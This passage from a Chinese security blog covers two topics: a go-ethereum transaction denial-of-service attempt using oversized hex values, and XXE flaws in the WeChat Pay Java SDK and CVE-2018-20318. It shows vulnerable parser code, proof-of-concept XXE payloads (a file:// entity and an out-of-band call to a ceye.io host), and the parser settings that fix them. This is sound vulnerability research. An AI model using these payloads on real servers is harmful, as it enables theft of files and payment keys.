common.HexToAddress(dec.Recipient), amount, gas, price, []<span class="keyword">byte</span>(dec.Payload))</span><br><span class="line">	s := types.NewEIP155Signer(big.NewInt(<span class="number">15</span>))</span><br><span class="line">	sign, err := types.GetRowTransaction(s, tx, key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">"&#123;error5&#125;"</span>)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">"&#123;"</span> + sign + <span class="string">"&#125;"</span>)</span><br></pre></td></tr></table></figure>
<p>简单的看了下，此处是对以太坊交易的功能，稍微理下流程：<br>转账请求：</p>
<p>进行请求的时候，可以有三种方式：<br>调用JSON-RPC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H &quot;Content-Type&quot;:application/json --data &apos;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;: [&#123;                                                                               </span><br><span class="line">  &quot;from&quot;: &quot;0xde1e758511a7c67e7db93d1c23c1060a21db4615&quot;,</span><br><span class="line">  &quot;to&quot;: &quot;0xd64a66c28a6ae5150af5e7c34696502793b91ae7&quot;,</span><br><span class="line">  &quot;value&quot;: &quot;0x1&quot;</span><br><span class="line">&#125;],</span><br><span class="line">&quot;id&quot;:67&#125;&apos; 172.25.0.10:8545</span><br></pre></td></tr></table></figure></p>
<p>调用js console</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eth.sendTransaction(&#123;&quot;from&quot;:eth.accounts[0],to:eth.accounts[1],value:web3.toWei(10,&apos;ether&apos;)&#125;)</span><br></pre></td></tr></table></figure>
<p>调用web3.js ，实质还是调用了js console API</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.sendTransaction(<span class="string">"from"</span>:eth.accounts[<span class="number">0</span>],to:eth.accounts[<span class="number">1</span>],value:web3.toWei(<span class="number">10</span>,<span class="string">'ether'</span>)&#125;)</span><br></pre></td></tr></table></figure>
<p>流程如下：</p>
<ul>
<li>用户输入转账的地址和转入的地址和转出的金额</li>
<li>系统通过转出的地址的私钥对转账信息进行签名（用于证明这 笔交易确实有本人进行）</li>
<li>系统对交易信息进行验证</li>
<li>把这笔交易入到本地的txpool中（就是缓存交易池）</li>
<li>把交易信息广播给其它节点<br>借用下seebug的图：<br><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525294348646.jpg" alt="-w830"></li>
</ul>
<p>在用户输入调用web3.js后，传入参数进行交易，在此处调用ethapi接口：<br>internal/ethapi/api.go 1071</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unc (s *PublicTransactionPoolAPI) SendTransaction(ctx context.Context, args SendTxArgs) (common.Hash, error) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Look up the wallet containing the requested signer</span></span><br><span class="line">	account := accounts.Account&#123;Address: args.From&#125;</span><br><span class="line"></span><br><span class="line">	wallet, err := s.b.AccountManager().Find(account)</span><br><span class="line">	......</span><br></pre></td></tr></table></figure>
<p>通过from来调取传入的账户地址</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">account := accounts.Account&#123;Address: args.From&#125;<span class="comment">//接收from参数</span></span><br><span class="line">wallet, err := s.b.AccountManager().Find(account)<span class="comment">//判断account是否存在</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(am *Manager)</span> <span class="title">Find</span><span class="params">(account Account)</span> <span class="params">(Wallet, error)</span></span> &#123;</span><br></pre></td></tr></table></figure>
<p>通过交易信息生成type包</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(args *SendTxArgs)</span> <span class="title">toTransaction</span><span class="params">()</span> *<span class="title">types</span>.<span class="title">Transaction</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> args.To == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> types.NewContractCreation(<span class="keyword">uint64</span>(*args.Nonce), (*big.Int)(args.Value), (*big.Int)(args.Gas), (*big.Int)(args.GasPrice), args.Data)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> types.NewTransaction(<span class="keyword">uint64</span>(*args.Nonce), *args.To, (*big.Int)(args.Value), (*big.Int)(args.Gas), (*big.Int)(args.GasPrice), args.Data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对交易进行签名</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signed, err := wallet.SignTx(account, tx, chainID)</span><br></pre></td></tr></table></figure>
<p>最后提交交易</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> submitTransaction(ctx, s.b, signed)</span><br></pre></td></tr></table></figure>
<p>在这里推测是使用了big.NewInt.SetString函数，导致了此处的OOM造成了拒绝服务的风险。但是单独测试的后期并没复现成功，存在点问题，可能根本原因不在这，只在节点上测试成功。误打误撞的找到了这个节点漏洞。</p>
<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>在客户端console中，使用对应的转账函数，此时使用其中的转账函数，将其中的gasPrice、gasvalue、value的值使用为对应的16进制长数据<br>将导致CPU占用。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eth.sendTransaction()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525447646588.jpg" alt="-w956"><br><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525447843242.jpg" alt="-w934"></p>
<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>在内存资源不足的情况下，程序会自动退出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">goroutine 1340 [chan receive]:</span><br><span class="line">github.com/ethereum/go-ethereum/p2p/discover.(*udp).</span><br></pre></td></tr></table></figure></p>
<p>在调用math.big.Rat.SetString的时候，浮点数过大会不解析，同样不会造成影响。<br><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525564158976.jpg" alt="-w710"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/fpcc/article/details/81050976</span><br><span class="line">https://tianyun6655.github.io/2017/09/24/以太坊源码交易/</span><br><span class="line">https://www.colabug.com/3485978.html</span><br><span class="line">https://cloud.tencent.com/developer/section/1143071</span><br><span class="line">https://www.jianshu.com/p/1b0ffb58f565</span><br><span class="line">https://github.com/zsfelfoldi/go-ethereum/wiki/Light-Ethereum-Subprotocol-%28LES%29</span><br><span class="line">https://paper.seebug.org/656/</span><br></pre></td></tr></table></figure>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[XXE 示例及利用-java—SDK-1]]></title>
      <url>/2019/01/28/Web%E6%B8%97%E9%80%8F/XXE/XXE%E5%AE%9E%E4%BE%8B%E5%8F%8A%E5%88%A9%E7%94%A82/</url>
      <content type="html"><![CDATA[<p>[TOC]</p>
<h1 id="XXE实例分析"><a href="#XXE实例分析" class="headerlink" title="XXE实例分析"></a>XXE实例分析</h1><p>在接着之前对XXE的了解和学习，但一直在实战中都没遇到，正好这段时间在同事的渗透工作中又遇到了微信SDK的XXE漏洞，便趁着这个机会结合之前对微信SDK中的XXE漏洞，总结一波。</p>
<h2 id="ex1"><a href="#ex1" class="headerlink" title="ex1"></a>ex1</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><ul>
<li>微信SDK XXE漏洞分析1</li>
</ul>
<p>没有找到原漏洞代码，看到原漏洞修复后代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip</span><br></pre></td></tr></table></figure></p>
<p>在这个案例中，漏洞逻辑为：<br>微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果，该接口接受XML格式的数据，攻击者可以构造恶意的回调数据（XML格式）来窃取商家服务器上的任何文件，一般支付服务器均为核心服务器，出现XXE导致任意文件。另外，一旦攻击者获得了关键支付的安全密钥（md5-key和商家信息，将可以直接实现0元支付购买任何商品。</p>
<p>因为白盒分析java实在有点强人所难，所以站在前人的肩膀上，一步到位，先看看出现这个漏洞的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">src/main/java/com/github/wxpay/sdk/WXPayUtil文件</span><br><span class="line">public static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;();</span><br><span class="line">            DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder();</span><br><span class="line">            InputStream stream = new ByteArrayInputStream(strXML.getBytes(&quot;UTF-8&quot;));</span><br><span class="line">            org.w3c.dom.Document doc = documentBuilder.parse(stream);</span><br><span class="line">            doc.getDocumentElement().normalize();</span><br><span class="line">            NodeList nodeList = doc.getDocumentElement().getChildNodes();</span><br><span class="line">            for (int idx = 0; idx &lt; nodeList.getLength(); ++idx) &#123;</span><br><span class="line">                Node node = nodeList.item(idx);</span><br><span class="line">                if (node.getNodeType() == Node.ELEMENT_NODE) &#123;</span><br><span class="line">                    org.w3c.dom.Element element = (org.w3c.dom.Element) node;</span><br><span class="line">                    data.put(element.getNodeName(), element.getTextContent());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                stream.close();</span><br><span class="line">            &#125; catch (Exception ex) &#123;</span><br><span class="line">                // do nothing</span><br><span class="line">            &#125;</span><br><span class="line">            return data;</span><br><span class="line">        &#125; catch (Exception ex) &#123;</span><br><span class="line">            WXPayUtil.getLogger().warn(&quot;Invalid XML, can not convert to map. Error message: &#123;&#125;. XML content: &#123;&#125;&quot;, ex.getMessage(), strXML);</span><br><span class="line">            throw ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>这里 可以看出xmlToMap 方法用作将string转换成map,所用的xml解析器直接处理了xml字符串，这种直接处理xml字符串，在服务端没有禁止外部dtd应用的时候，造成了XXE漏洞。</p>
<ul>
<li>详情分析<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;(); </span><br><span class="line">这个地方使用了java 中的hashmap，（Hash算法就是根据某个算法将一系列目标对象转换成地址，当要获取某个元素的时候，只需要将目标对象做相应的运算获得地址，直接获取。）</span><br><span class="line">对hashmap不熟悉的朋友可以看一下 https://www.cnblogs.com/dreamroute/p/3843600.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>关键解析出现在以下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.w3c.dom.Document doc = documentBuilder.parse(stream);</span><br><span class="line">doc.getDocumentElement().normalize();</span><br></pre></td></tr></table></figure></p>
<p>其中，strXML的内存中数据流使用parse函数处理，跟踪parse函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public Document parse(InputStream is)</span><br><span class="line">    throws SAXException, IOException &#123;</span><br><span class="line">    if (is == null) &#123;</span><br><span class="line">        throw new IllegalArgumentException(&quot;InputStream cannot be null&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InputSource in = new InputSource(is);</span><br><span class="line">    return parse(in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>return的parse（in） 类似于xml解析器 将xml转换为xmlDOM，涉及到到DOM解析XML，详情可以参考下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/guchuanhang/article/details/51866114</span><br></pre></td></tr></table></figure></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>测试代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package com.github.wxpay.sdk;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class test1 &#123;</span><br><span class="line"></span><br><span class="line">    public static void TestXxe()&#123;</span><br><span class="line">        String xmlstr = &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt; \n&quot; +</span><br><span class="line">                &quot;&lt;!DOCTYPE xxe [\n&quot; +</span><br><span class="line">                &quot;&lt;!ELEMENT name ANY &gt;\n&quot; +</span><br><span class="line">                &quot;&lt;!ENTITY xxe SYSTEM \&quot;file://1.txt\&quot; &gt;]&gt;\n&quot; +</span><br><span class="line">                &quot;&lt;root&gt;\n&quot; +</span><br><span class="line">                &quot;&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&quot; +</span><br><span class="line">                &quot;&lt;/root&gt;&quot;;</span><br><span class="line">        try &#123;</span><br><span class="line">            System.out.println(xmlstr);</span><br><span class="line">            System.out.println(&quot;+++++++++++++++++=&quot;);</span><br><span class="line">            //System.out.println(WXPayUtil.isSignatureValid(xmlstr,config.getkey()));</span><br><span class="line">            Map&lt;String,String&gt; hm = WXPayUtil.xmlToMap(xmlstr);</span><br><span class="line">            System.out.println(&quot;+++++++++++++++++=&quot;);</span><br><span class="line">            System.out.println(hm);</span><br><span class="line"></span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] argvs)&#123;</span><br><span class="line">        System.out.println(&quot;11111&quot;);</span><br><span class="line">        test2 test3 = new test2();</span><br><span class="line">        test3.Test2();</span><br><span class="line">        //WXPayUtil WXXxe = new WXPayUtil();//调用存在漏洞的代码</span><br><span class="line">        //WXXxe.mapToXml();</span><br><span class="line">        TestXxe();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在下载的漏洞示例代码中，已经是更新后的代码了，所以为了使漏洞复现，得注释掉其中部分禁止函数。</p>
<p>当配置documentBuilderFactory.setFeature(“<a href="http://apache.org/xml/features/disallow-doctype-decl&quot;" target="_blank" rel="noopener">http://apache.org/xml/features/disallow-doctype-decl&quot;</a>, true)为true时， 完全禁止DTD实体的使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在 com.github.wxpay.sdk.WXPayXmlUtil函数中，进行了安全配置</span><br><span class="line">documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); </span><br><span class="line"></span><br><span class="line">报错：[Fatal Error] :2:10: 将功能 &quot;http://apache.org/xml/features/disallow-doctype-decl&quot; 设置为“真”时, 不允许使用 DOCTYPE。</span><br></pre></td></tr></table></figure></p>
<p>单独将该配置该为false，可以使用内部实体调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;11111111&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">正常反馈</span><br><span class="line">&#123;name=111111&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用外部实体时，因为本例子中使用的其他防护措施中，导致了禁止外部实体,测试时可以将以下防护注释掉。这个时候就可以正常进行外部实体注入。</p>
<h3 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">src/main/java/com/github/wxpay/sdk/WXPayXmlUtil中</span><br><span class="line"></span><br><span class="line">documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">        documentBuilderFactory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">        documentBuilderFactory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">        documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span><br><span class="line">        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</span><br><span class="line">        documentBuilderFactory.setXIncludeAware(false);</span><br><span class="line">        documentBuilderFactory.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure>
<p>详情分析 参考：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xerces.apache.org/xerces2-j/features.html#external-general-entities</span><br><span class="line">https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5</span><br></pre></td></tr></table></figure></p>
<h2 id="ex2"><a href="#ex2" class="headerlink" title="ex2"></a>ex2</h2><p>在简单分析了2018/07/03左右爆出来的微信SDK XXE漏洞函数后，可以回头来看一下CVE-2018-20318和CVE-2019-5312这两个CVE。</p>
<ul>
<li>CVE-2018-20318</li>
</ul>
<p>先看最开始的这个CVE：<br>根据issus 889</p>
<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>已修复后漏洞代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">private Document getXmlDoc() &#123;</span><br><span class="line">    if (this.xmlDoc != null) &#123;</span><br><span class="line">      return this.xmlDoc;</span><br><span class="line">	    &#125;</span><br><span class="line">	</span><br><span class="line">	    try &#123;</span><br><span class="line">	      this.xmlDoc = DocumentBuilderFactory</span><br><span class="line">	        .newInstance()</span><br><span class="line">	        .newDocumentBuilder()</span><br><span class="line">	      final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();</span><br><span class="line">	      factory.setExpandEntityReferences(false);</span><br><span class="line">	      this.xmlDoc = factory.newDocumentBuilder()</span><br><span class="line">	        .parse(new ByteArrayInputStream(this.xmlString.getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">	      return xmlDoc;</span><br><span class="line">	    &#125; catch (SAXException | IOException | ParserConfigurationException e) &#123;</span><br><span class="line">      throw new RuntimeException(&quot;非法的xml文本内容：&quot; + this.xmlString);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>根据对比：<br>原漏洞代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">private Document getXmlDoc() &#123;</span><br><span class="line">    if (this.xmlDoc != null) &#123;</span><br><span class="line">      return this.xmlDoc;</span><br><span class="line">	    &#125;</span><br><span class="line">	</span><br><span class="line">	    try &#123;</span><br><span class="line">	      this.xmlDoc = DocumentBuilderFactory</span><br><span class="line">	        .newInstance()</span><br><span class="line">	        .newDocumentBuilder()</span><br><span class="line">	        .parse(new ByteArrayInputStream(this.xmlString.getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">	      return xmlDoc;</span><br><span class="line">	    &#125; catch (SAXException | IOException | ParserConfigurationException e) &#123;</span><br><span class="line">      throw new RuntimeException(&quot;非法的xml文本内容：&quot; + this.xmlString);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>这里可以明显看到，parse创建了解析器，但没有如上的对外部实体进行禁止</p>
<p>坑点：</p>
<p>在复现的时候，最好使用maven项目，用pom直接导入所需组件。这里需要补充一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;xstream&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.4.7&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>
<p>测试payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public void testToMap() throws Exception &#123;</span><br><span class="line">    WxPayOrderQueryResult result = new WxPayOrderQueryResult();</span><br><span class="line">    result.setXmlString(&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot; +</span><br><span class="line">            &quot; \n&quot; +</span><br><span class="line">            &quot;&lt;!DOCTYPE ANY [\n&quot; +</span><br><span class="line">            &quot;&lt;!ENTITY test SYSTEM \&quot;http://th9bvw.ceye.io\&quot; &gt;]&gt;\n&quot; +</span><br><span class="line">            &quot; \n&quot; +</span><br><span class="line">            &quot;&lt;root&gt;&amp;test;&lt;/root&gt; &quot;);</span><br><span class="line">    Map&lt;String, String&gt; map = result.toMap();</span><br><span class="line">    System.out.println(map);</span><br><span class="line"></span><br><span class="line">    //Assert.assertEquals(map.get(&quot;return_code&quot;), &quot;SUCCESS&quot;);</span><br><span class="line">    //Assert.assertEquals(map.get(&quot;attach&quot;), &quot;订单额外描述&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>进行函数跟踪tomap到 BaseWxPayResult.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public Map&lt;String, String&gt; toMap() &#123;</span><br><span class="line">    if (StringUtils.isBlank(this.xmlString)) &#123;</span><br><span class="line">      throw new RuntimeException(&quot;xml数据有问题，请核实！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, String&gt; result = Maps.newHashMap();</span><br><span class="line">    Document doc = this.getXmlDoc();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      NodeList list = (NodeList) XPathFactory.newInstance().newXPath()</span><br><span class="line">        .compile(&quot;/xml/*&quot;)</span><br><span class="line">        .evaluate(doc, XPathConstants.NODESET);</span><br><span class="line">      int len = list.getLength();</span><br><span class="line">      for (int i = 0; i &lt; len; i++) &#123;</span><br><span class="line">        result.put(list.item(i).getNodeName(), list.item(i).getTextContent());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; catch (XPathExpressionException e) &#123;</span><br><span class="line">      throw new RuntimeException(&quot;非法的xml文本内容：&quot; + xmlString);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>追溯到 getXmlDoc</p>
<p>可以在ceye上看到原漏洞导致的结果</p>
<h3 id="修复措施-1"><a href="#修复措施-1" class="headerlink" title="修复措施"></a>修复措施</h3><p>修改配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">documentBuilderFactory.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure></p>
<p>查看下详情<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public void setExpandEntityReferences(boolean expandEntityRef) &#123;</span><br><span class="line">        this.expandEntityRef = expandEntityRef;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>这个初始化设置为true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private boolean expandEntityRef = true;</span><br></pre></td></tr></table></figure></p>
<p>但是这样修复的后果就是没有什么用，导致了CVE-2019-5312的问题<br>实际中可以参照ex1中的修复 </p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul>
<li>CVE-2019-5312<h2 id="ex3-–待补充"><a href="#ex3-–待补充" class="headerlink" title="ex3 –待补充"></a>ex3 –待补充</h2></li>
